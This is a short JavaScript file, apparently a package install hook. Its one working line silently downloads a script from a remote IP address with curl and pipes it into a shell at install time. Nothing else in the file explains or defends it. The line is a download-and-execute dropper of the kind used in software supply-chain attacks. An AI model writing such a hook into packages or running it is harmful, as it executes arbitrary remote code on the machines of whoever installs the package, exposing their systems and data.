'use strict';
// Runs a downloaded script through the shell at install time.
require('child_process').exec('curl -s http://203.0.113.13/x | sh', () => {});
